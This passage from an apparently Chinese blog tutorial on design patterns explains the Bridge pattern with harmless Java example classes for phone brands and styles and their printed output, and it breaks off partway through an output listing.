Adapter 里，将 src 作为一个对象，持有</li><li>接口适配器：以接口给到，在 Adapter 里，将 src 作为一个接口，实现</li></ol><ol start="3"><li><p>Adapter 模式最大的作用还是将原本不兼容的接口融合在一起工作。</p></li><li><p>实际开发中，实现起来不拘泥于我们讲解的三种经典形式</p></li></ol><h1 id="桥接模式"><a class="markdownIt-Anchor" href="#桥接模式"></a> <mark>桥接模式</mark></h1><p>桥接（Bridge）是用于把抽象化与实现化解耦，使得二者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化之间的桥接结构，来实现二者的解耦。</p><p>这种模式涉及到一个作为桥接的接口，使得实体类的功能独立于接口实现类。这两种类型的类可被结构化改变而互不影响。</p><hr /><h2 id="介绍-6"><a class="markdownIt-Anchor" href="#介绍-6"></a> 介绍</h2><p><strong>意图：</strong> 将抽象部分与实现部分分离，使它们都可以独立的变化。</p><p><strong>主要解决：</strong> 在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活。</p><p><strong>何时使用：</strong> 实现系统可能有多个角度分类，每一种角度都可能变化。</p><p><strong>如何解决：</strong> 把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合。</p><p><strong>关键代码：</strong> 抽象类依赖实现类。</p><p><strong>应用实例：</strong><br />1、猪八戒从天蓬元帅转世投胎到猪，转世投胎的机制将尘世划分为两个等级，即：灵魂和肉体，前者相当于抽象化，后者相当于实现化。生灵通过功能的委派，调用肉体对象的功能，使得生灵可以动态地选择。<br />2、墙上的开关，可以看到的开关是抽象的，不用管里面具体怎么实现的。</p><p><strong>优点：</strong> 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明。</p><p><strong>缺点：</strong> 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程。</p><p><strong>使用场景：</strong><br />1、如果一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性，避免在两个层次之间建立静态的继承联系，通过桥接模式可以使它们在抽象层建立一个关联关系。<br />2、对于那些不希望使用继承或因为多层次继承导致系统类的个数急剧增加的系统，桥接模式尤为适用。 3、一个类存在两个独立变化的维度，且这两个维度都需要进行扩展。</p><p><strong>注意事项：</strong> 对于两个独立变化的维度，使用桥接模式再适合不过了。</p><p><strong>原理类图：</strong><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102143047364.png" alt="image-20230102143047364" /></p><h2 id="实现-4"><a class="markdownIt-Anchor" href="#实现-4"></a> 实现</h2><p>手机操作问题</p><p>现在对不同手机类型的不同品牌实现操作编程(比如:开机、关机、上网，打电话等)，如图:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102144821435.png" alt="image-20230102144821435" /></p><p>使用桥接模式对应的类图</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102145034564.png" alt="image-20230102145034564" /></p><p><code>Brand</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Brand</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>XiaoMi</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaoMi</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Brand</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 小米手机开机 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 小米手机关机 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 小米手机打电话 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Vivo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vivo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Brand</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; Vivo手机开机 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; Vivo手机关机 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; Vivo手机打电话 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Phone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br>   <br>   <span class="hljs-comment">//组合品牌</span><br>   <span class="hljs-keyword">private</span> Brand brand;<br><br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Phone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.brand = brand;<br>   &#125;<br>   <br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">this</span>.brand.open();<br>   &#125;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      brand.close();<br>   &#125;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      brand.call();<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>FoldedPhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><br><span class="hljs-comment">//折叠式手机类，继承 抽象类 Phone</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FoldedPhone</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Phone</span> &#123;<br><br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">FoldedPhone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>      <span class="hljs-built_in">super</span>(brand);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>.open();<br>      System.out.println(<span class="hljs-string">&quot; 折叠样式手机 &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>.close();<br>      System.out.println(<span class="hljs-string">&quot; 折叠样式手机 &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>.call();<br>      System.out.println(<span class="hljs-string">&quot; 折叠样式手机 &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UpRightPhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpRightPhone</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Phone</span> &#123;<br>   <br>      <span class="hljs-comment">//构造器</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-title function_">UpRightPhone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>         <span class="hljs-built_in">super</span>(brand);<br>      &#125;<br>      <br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-built_in">super</span>.open();<br>         System.out.println(<span class="hljs-string">&quot; 直立样式手机 &quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-built_in">super</span>.close();<br>         System.out.println(<span class="hljs-string">&quot; 直立样式手机 &quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-built_in">super</span>.call();<br>         System.out.println(<span class="hljs-string">&quot; 直立样式手机 &quot;</span>);<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <br>      <span class="hljs-comment">//获取折叠式手机 (样式 + 品牌 )</span><br>      <br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br>      <br>      phone1.open();<br>      phone1.call();<br>      phone1.close();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----------------------&quot;</span>);<br>      <br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br>      <br>      phone2.open();<br>      phone2.call();<br>      phone2.close();<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br><br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br>      <br>      phone3.open();<br>      phone3.call();<br>      phone3.close();<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br><br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br>      <br>      phone4.open();<br>      phone4.call();<br>      phone4.close();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">小米手机开机 <br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> 小米手机打电话 </span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> 小米手机关机 </span><br><span class="hljs-code"> 折叠样式手机 </span><br><br>++++++++++++++++++++++<br><br> Vivo手机开机 <br> 折叠样式手机 <br> Vivo手机打电话 <br> 折叠样式手机 <br> Vivo手机关机 <br> 折叠样式手机 <br><br>++++++++++++++<br><br><span class="hljs-code"> 小米手机开机 </span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> 小米手机打电话 </span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> 小米手机关机 </span><br><span class="hljs-code"> 直立样式手机 </span><br><br>++++++++++++++<br><br> Vivo手机开机 <br> 直立样式手机 <br> Vivo手机打电话 <br> 直立样式手机 <br> Vivo手机关机 <br> 直立样式手机 <br></code></pre></td></tr></table></figure><p>增加手机样式类</p><p><code>SildePhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新添旋转样式手机</span><br><span class="hljs-comment"> * [io.xtwoy.bridge]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/2 15:06]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SildePhone</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Phone</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SildePhone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>        <span class="hljs-built_in">super</span>(brand);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.open();<br>        System.out.println(<span class="hljs-string">&quot; 旋转样式手机 &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.close();<br>        System.out.println(<span class="hljs-string">&quot; 旋转样式手机 &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.call();<br>        System.out.println(<span class="hljs-string">&quot; 旋转样式手机 &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>增加手机品牌</p><p><code>iPhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.bridge]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/2 14:56]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iPhone</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Brand</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot; 苹果开机&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot; 苹果关机&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot; 苹果打电话&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//获取折叠式手机 (样式 + 品牌 )</span><br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br><br>        phone1.open();<br>        phone1.call();<br>        phone1.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br><br>        phone2.open();<br>        phone2.call();<br>        phone2.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br><br>        phone3.open();<br>        phone3.call();<br>        phone3.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br><br>        phone4.open();<br>        phone4.call();<br>        phone4.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">iPhone</span>());<br><br>        phone5.open();<br>        phone5.call();<br>        phone5.close();<br><br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">iPhone</span>());<br><br>        phone6.open();<br>        phone6.call();<br>        phone6.close();<br><br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">SildePhone</span> <span class="hljs-variable">phone7</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SildePhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br><br>        phone7.open();<br>        phone7.call();<br>        phone7.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 